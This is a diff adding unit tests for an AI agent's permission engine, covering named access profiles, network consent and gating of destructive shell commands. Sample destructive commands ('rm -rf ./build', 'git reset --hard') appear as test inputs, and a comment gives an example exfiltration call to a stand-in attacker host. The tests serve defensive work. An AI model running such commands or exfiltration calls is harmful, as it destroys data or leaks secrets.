@@ -770,6 +770,28 @@ describe("PermissionEngine", () => {
     expect(result.reason.type).toBe("mode");
   });
 
+  it("keeps legacy mode authority when copied profile fields lack an authority marker", () => {
+    const legacyWorkspace = {
+      ...workspace,
+      permissions: {
+        ...workspace.permissions,
+        accessSandboxMode: "read-only" as const,
+        accessApprovalPolicy: "never" as const,
+        accessNetworkMode: "disabled" as const,
+      },
+    };
+
+    const result = evaluate({
+      workspace: legacyWorkspace,
+      toolName: "write_file",
+      mode: "bypass_permissions",
+      toolInput: { path: "notes.txt" },
+    });
+
+    expect(result.decision).toBe("allow");
+    expect(result.reason.type).toBe("mode");
+  });
+
   it("hard-denies scoped filesystem escapes before they can become approval prompts", () => {
     const scopedWorkspace = {
       ...workspace,
@@ -848,5 +870,420 @@ describe("PermissionEngine", () => {
 
     expect(result.decision).toBe("deny");
     expect(result.reason.type).toBe("guardrail");
+  });
+
+  describe("named access profile boundaries", () => {
+    const namedWorkspace = (overrides: Partial<Workspace["permissions"]> = {}): Workspace => ({
+      ...workspace,
+      isTemp: true,
+      permissions: {
+        ...workspace.permissions,
+        accessProfileId: "bounded",
+        accessSandboxMode: "workspace-write",
+        accessApprovalPolicy: "on-request",
+        accessReviewer: "user",
+        accessNetworkMode: "on-request",
+        ...overrides,
+      },
+    });
+
+    it.each(["rm -rf ./build", "git reset --hard"])(
+      "retains explicit consent for destructive or privileged shell action %s",
+      (command) => {
+        expect(
+          evaluate({
+            workspace: namedWorkspace(),
+            toolName: "run_command",
+            command,
+            approvalType: "run_command",
+          }).decision,
+        ).toBe("ask");
+        expect(
+          evaluate({
+            workspace: namedWorkspace({ accessApprovalPolicy: "never" }),
+            toolName: "run_command",
+            command,
+            approvalType: "run_command",
+          }).decision,
+        ).toBe("deny");
+      },
+    );
+
+    it.each([
+      ["workspace write", { toolName: "write_file", toolInput: { path: "notes.txt" } }],
+      [
+        "generated artifact",
+        { toolName: "generate_document", toolInput: { filename: "note.docx" } },
+      ],
+      [
+        "routine sandboxed command",
+        { toolName: "run_command", approvalType: "run_command" as const, command: "npm test" },
+      ],
+    ])("allows an in-scope %s without a review", (_label, input) => {
+      const result = evaluate({
+        ...input,
+        workspace: namedWorkspace(),
+        // The named profile is authoritative even if a legacy caller passes
+        // the old prompting mode.
+        mode: "default",
+      });
+
+      expect(result.decision).toBe("allow");
+      expect(result.reason.type).toBe("other");
+    });
+
+    it("treats user and automatic reviewers identically for the same non-read boundary", () => {
+      const user = evaluate({
+        workspace: namedWorkspace({ accessReviewer: "user" }),
+        toolName: "open_url",
+        mode: "bypass_permissions",
+        toolInput: { url: "https://docs.example.com/page" },
+      });
+      const automatic = evaluate({
+        workspace: namedWorkspace({ accessReviewer: "auto-review" }),
+        toolName: "open_url",
+        mode: "bypass_permissions",
+        toolInput: { url: "https://docs.example.com/page" },
+      });
+
+      expect(user.decision).toBe("ask");
+      expect(automatic.decision).toBe(user.decision);
+    });
+
+    // A profile declaring `network: "on-request"` asks before ANY internet
+    // access, reads included. web_fetch is the canonical exfiltration
+    // primitive — `web_fetch("https://attacker.test/?d=<secrets>")` is a read —
+    // so exempting it under the profile whose stated purpose is asking first
+    // defeats the profile.
+    it("prompts for read-only web lookups when the profile asks on request", () => {
+      for (const [toolName, toolInput] of [
+        ["web_search", { query: "Jev" }],
+        ["web_fetch", { url: "https://docs.example.com/page" }],
+        ["x_search", { query: "Jev" }],
+        ["http_request", { url: "https://docs.example.com/page", method: "GET" }],
+      ] as const) {
+        const result = evaluate({
+          workspace: namedWorkspace(),
+          toolName,
+          mode: "bypass_permissions",
+          toolInput,
+        });
+
+        expect(result.decision, toolName).toBe("ask");
+      }
+    });
+
+    it("allows routine read-only web lookups when the profile enables network", () => {
+      for (const [toolName, toolInput] of [
+        ["web_search", { query: "Jev" }],
+        ["web_fetch", { url: "https://docs.example.com/page" }],
+        ["x_search", { query: "Jev" }],
+        ["http_request", { url: "https://docs.example.com/page", method: "GET" }],
+      ] as const) {
+        const result = evaluate({
+          workspace: namedWorkspace({ accessNetworkMode: "enabled" }),
+          toolName,
+          mode: "bypass_permissions",
+          toolInput,
+        });
+
+        expect(result.decision, toolName).toBe("allow");
+      }
+    });
+
+    it("keeps credential-backed web reads behind explicit consent", () => {
+      const result = evaluate({
+        workspace: namedWorkspace(),
+        toolName: "web_fetch",
+        mode: "bypass_permissions",
+        toolInput: {
+          url: "https://docs.example.com/private",
+          credentialId: "credential-1",
+        },
+      });
+
+      expect(result.decision).toBe("ask");
+      expect(result.reason.summary).toContain("internet");
+    });
+
+    it("allows an explicit network grant through an on-request profile", () => {
+      const result = evaluate({
+        workspace: namedWorkspace(),
+        toolName: "web_fetch",
+        mode: "default",
+        toolInput: { url: "https://docs.example.com/page" },
+        rules: [
+          {
+            source: "session",
+            effect: "allow",
+            scope: { kind: "domain", toolName: "web_fetch", domain: "docs.example.com" },
+          },
+        ],
+      });
+
+      expect(result.decision).toBe("allow");
+      expect(result.matchedRule?.effect).toBe("allow");
+    });
+
+    it("allows a profile domain grant without a second network prompt", () => {
+      const result = evaluate({
+        workspace: namedWorkspace({
+          accessDomainRules: [{ pattern: "docs.example.com", access: "allow" }],
+        }),
+        toolName: "web_fetch",
+        mode: "default",
+        toolInput: { url: "https://docs.example.com/page" },
+      });
+
+      expect(result.decision).toBe("allow");
+    });
+
+    it("keeps a profile domain ceiling ahead of a broad session grant", () => {
+      const result = evaluate({
+        workspace: namedWorkspace({
+          accessDomainRules: [{ pattern: "docs.example.com", access: "allow" }],
+        }),
+        toolName: "web_fetch",
+        mode: "default",
+        toolInput: { url: "https://api.example.com/page" },
+        rules: [
+          {
+            source: "session",
+            effect: "allow",
+            scope: { kind: "tool", toolName: "web_fetch" },
+          },
+        ],
+      });
+
+      expect(result.decision).toBe("deny");
+      expect(result.reason.metadata).toEqual(
+        expect.objectContaining({ policyReason: "profile_domain_not_allowed" }),
+      );
+    });
+
+    it("keeps routine reads available under never while retaining explicit grants", () => {
+      const neverWorkspace = namedWorkspace({
+        accessApprovalPolicy: "never",
+        accessNetworkMode: "on-request",
+      });
+      const missingNetwork = evaluate({
+        workspace: neverWorkspace,
+        toolName: "web_fetch",
+        mode: "default",
+        toolInput: { url: "https://docs.example.com/page" },
+      });
+      const grantedNetwork = evaluate({
+        workspace: neverWorkspace,
+        toolName: "web_fetch",
+        mode: "default",
+        toolInput: { url: "https://docs.example.com/page" },
+        rules: [
+          {
+            source: "session",
+            effect: "allow",
+            scope: { kind: "domain", toolName: "web_fetch", domain: "docs.example.com" },
+          },
+        ],
+      });
+
+      // `network: "on-request"` still gates an ungranted read even when the
+      // approval policy is "never" — the profile asked to decide per domain.
+      // An explicit domain allow rule remains the way to grant one.
+      expect(missingNetwork.decision).not.toBe("allow");
+      expect(grantedNetwork.decision).toBe("allow");
+    });
+
+    it("preserves explicit ask rules and genuine consent gates", () => {
+      const askWorkspace = namedWorkspace();
+      const explicitAsk = evaluate({
+        workspace: askWorkspace,
+        toolName: "write_file",
+        mode: "default",
+        toolInput: { path: "notes.txt" },
+        rules: [
+          {
+            source: "profile",
+            effect: "ask",
+            scope: { kind: "tool", toolName: "write_file" },
+          },
+        ],
+      });
+      const connectorConsent = evaluate({
+        workspace: askWorkspace,
+        toolName: "calendar_action",
+        approvalType: "external_service",
+        mode: "bypass_permissions",
+      });
+      const neverConsent = evaluate({
+        workspace: namedWorkspace({ accessApprovalPolicy: "never", accessNetworkMode: "enabled" }),
+        toolName: "calendar_action",
+        approvalType: "external_service",
+        mode: "bypass_permissions",
+      });
+
+      expect(explicitAsk.decision).toBe("ask");
+      expect(connectorConsent.decision).toBe("ask");
+      expect(neverConsent.decision).toBe("deny");
+      expect(neverConsent.suggestions).toEqual([]);
+    });
+
+    it.each([
+      ["risk gate", "risk_gate" as const, "run_command"],
+      ["delete", "delete_file" as const, "delete_file"],
+      ["data export", "data_export" as const, "http_request"],
+      ["protected credential", "protected_credential" as const, "http_request"],
+      ["location", "location_access" as const, "get_current_location"],
+    ])("does not silently bypass %s consent in Full access", (_label, approvalType, toolName) => {
+      const result = evaluate({
+        workspace: namedWorkspace({
+          accessSandboxMode: "danger-full-access",
+          accessApprovalPolicy: "never",
+          accessReviewer: "none",
+          accessNetworkMode: "enabled",
+        }),
+        toolName,
+        approvalType,
+        mode: "bypass_permissions",
+        ...(toolName === "http_request"
+          ? { toolInput: { url: "https://api.example.com/items", method: "POST" } }
+          : {}),
+      });
+
+      expect(result.decision).toBe("deny");
+    });
+
+    it("keeps a bounded temporary session root usable without a review", () => {
+      const temporaryRoot = "/tmp/workspace/session-scratch";
+      const result = evaluate({
+        workspace: {
+          ...namedWorkspace(),
+          path: temporaryRoot,
+        },
+        toolName: "write_file",
+        mode: "default",
+        toolInput: { path: "scribe-conversation.md" },
+      });
+
+      expect(result.decision).toBe("allow");
+    });
+
+    it("keeps a danger-full sandbox independent from an on-request consent policy", () => {
+      const result = evaluate({
+        workspace: namedWorkspace({
+          accessSandboxMode: "danger-full-access",
+          accessApprovalPolicy: "on-request",
+          accessReviewer: "user",
+          accessNetworkMode: "enabled",
+          unrestrictedFileAccess: true,
+        }),
+        toolName: "write_file",
+        mode: "default",
+        toolInput: { path: "/tmp/other-session/output.txt" },
+      });
+
+      expect(result.decision).toBe("allow");
+    });
+
+    it("hard-denies a read-only profile before an allow rule can widen it", () => {
+      const result = evaluate({
+        workspace: namedWorkspace({
+          accessSandboxMode: "read-only",
+          accessNetworkMode: "disabled",
+          write: true,
+          delete: true,
+          shell: true,
+        }),
+        toolName: "write_file",
+        mode: "bypass_permissions",
+        toolInput: { path: "notes.txt" },
+        rules: [
+          {
+            source: "session",
+            effect: "allow",
+            scope: { kind: "tool", toolName: "write_file" },
+          },
+        ],
+      });
+
+      expect(result.decision).toBe("deny");
+      expect(result.reason.summary).toContain("read-only");
+    });
+
+    it("keeps read-only external reads on the explicit-consent path", () => {
+      const outside = "/tmp/other-session/reference.txt";
+      const result = evaluate({
+        workspace: namedWorkspace({
+          accessSandboxMode: "read-only",
+          accessNetworkMode: "disabled",
+        }),
+        toolName: "read_file",
+        approvalType: "external_file_access",
+        mode: "default",
+        path: outside,
+        toolInput: { path: outside },
+      });
+
+      expect(result.decision).toBe("ask");
+      expect(result.reason.summary).toContain("explicit consent");
+    });
+
+    it("asks for an unscoped external file exception and denies it under never", () => {
+      const outside = "/tmp/other-session/output.txt";
+      const request = {
+        toolName: "write_file",
+        approvalType: "external_file_access" as const,
+        mode: "default" as const,
+        path: outside,
+        toolInput: { path: outside },
+      };
+
+      expect(evaluate({ ...request, workspace: namedWorkspace() }).decision).toBe("ask");
+      expect(
+        evaluate({
+          ...request,
+          workspace: namedWorkspace({ accessApprovalPolicy: "never" }),
+        }).decision,
+      ).toBe("deny");
+    });
+
+    it("supports the legacy and shadow rollout gates without widening a named profile", () => {
+      const request = {
+        workspace: namedWorkspace(),
+        toolName: "write_file",
+        mode: "default" as const,
+        rules: [],
+        toolInput: { path: "notes.txt" },
+      };
+      const previous = process.env.COWORK_ACCESS_POLICY_VERSION;
+      try {
+        process.env.COWORK_ACCESS_POLICY_VERSION = "legacy";
+        const legacy = PermissionEngine.evaluate(request);
+        expect(legacy.decision).toBe("ask");
+        expect(legacy.metadata).toEqual(
+          expect.objectContaining({ accessPolicyVersion: "legacy", namedBoundary: false }),
+        );
+
+        process.env.COWORK_ACCESS_POLICY_VERSION = "boundary";
+        const boundary = PermissionEngine.evaluate(request);
+        expect(boundary.decision).toBe("allow");
+        expect(boundary.metadata).toEqual(
+          expect.objectContaining({ accessPolicyVersion: "boundary", namedBoundary: true }),
+        );
+
+        process.env.COWORK_ACCESS_POLICY_VERSION = "shadow";
+        const shadow = PermissionEngine.evaluate(request);
+        expect(shadow.decision).toBe("ask");
+        expect(shadow.metadata).toEqual(
+          expect.objectContaining({
+            accessPolicyVersion: "shadow",
+            boundaryDecision: "allow",
+            boundaryPolicyVersion: "boundary",
+          }),
+        );
+      } finally {
+        if (previous === undefined) delete process.env.COWORK_ACCESS_POLICY_VERSION;
+        else process.env.COWORK_ACCESS_POLICY_VERSION = previous;
+      }
+    });
   });
 });
